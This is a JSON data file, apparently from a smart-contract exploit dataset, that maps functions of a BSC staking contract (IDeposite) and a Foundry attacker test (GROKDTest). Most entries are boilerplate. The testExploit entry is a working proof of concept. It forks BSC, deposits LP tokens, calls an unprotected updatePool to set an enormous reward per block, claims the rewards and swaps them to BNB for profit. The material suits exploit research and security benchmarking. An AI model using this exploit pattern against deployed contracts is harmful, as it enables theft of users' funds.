[
  {
    "contract/interface": "IDeposite",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDeposite",
    "source_type": "victim_contract",
    "function_name": "depositFromIDO",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDeposite",
    "source_type": "victim_contract",
    "function_name": "pending",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDeposite",
    "source_type": "victim_contract",
    "function_name": "poolInfo",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDeposite",
    "source_type": "victim_contract",
    "function_name": "reward",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDeposite",
    "source_type": "victim_contract",
    "function_name": "update",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDeposite",
    "source_type": "victim_contract",
    "function_name": "updatePool",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDeposite",
    "source_type": "victim_contract",
    "function_name": "userInfo",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDeposite",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 37_622_476);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "GROKDTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        deal(address(this), 5 ether);\n        uint256 _beforeB = address(this).balance;\n        approveAll();\n        getLpToken(5 ether);\n        {\n            (uint256 startBlock, uint256 endBlock, uint256 rewardPerBlock) = depositor.poolInfo(0);\n            console2.log(\"get startBlock is \", startBlock);\n            console2.log(\"get endBlock is \", endBlock);\n            console2.log(\"get rewardPerBlock is \", rewardPerBlock);\n            (uint256 bnbAmount, uint256 erc20Amount, uint256 lpAmount) = depositor.pending(address(this));\n            console2.log(\"current bnbAmount reward is \", bnbAmount);\n            console2.log(\"current profit erc20Amount reward is \", erc20Amount);\n            console2.log(\"current lpAmount reward is \", lpAmount);\n\n            //set the pool params,could get a very high reward per block.\n            IDeposite.PoolInfo memory _poolInfo = IDeposite.PoolInfo({\n                startBlock: 0,\n                endBlock: block.number + 100_000_000,\n                rewardPerBlock: 48_000_000 ether\n            });\n            //deposit token to contract.\n            uint256 depositeAmount = pair_token.balanceOf(address(this));\n            console2.log(\"deposit lp amount is \", depositeAmount);\n            console2.log(\"total token in pool is \", grokd.balanceOf(_deposite));\n            depositor.depositFromIDO(address(this), depositeAmount);\n            vm.roll(block.number + 1);\n            //update pool\n            depositor.updatePool(0, _poolInfo);\n            (uint256 startBlock2, uint256 endBlock2, uint256 rewardPerBlock2) = depositor.poolInfo(0);\n            console2.log(\"after set pooldate startBlock is \", startBlock2);\n            console2.log(\"after set pooldate endBlock is \", endBlock2);\n            console2.log(\"after set pooldate rewardPerBlock is \", rewardPerBlock2);\n            /*(uint256 startBlock2, uint256 endBlock2, uint256 rewardPerBlock2) = depositor.poolInfo(0);\n         console2.log(\" startBlock2 is \",startBlock2);\n        console2.log(\"get endBlock2 is \",endBlock2);\n        console2.log(\"get rewardPerBlock2 is \",rewardPerBlock2);*/\n            //update reward\n            vm.roll(block.number + 1);\n            depositor.update();\n\n            (uint256 bnbAmount2, uint256 erc20Amount2, uint256 lpAmount2) = depositor.pending(address(this));\n            console2.log(\"affter one block get bnbAmount2 is \", bnbAmount2);\n            console2.log(\"affter one block get grokd Amount2 is \", erc20Amount2);\n            console2.log(\"affter one block get lpAmount2 is \", lpAmount2);\n            depositor.reward();\n            swapToken2Bnb(grokd.balanceOf(address(this)));\n        }\n        uint256 _afterB = address(this).balance;\n        uint256 _profit = _afterB - _beforeB;\n        console2.log(\"total profit bnb is \", _profit);\n    }\n    //get lp token and deposit it.\n\n",
    "description": ""
  }
]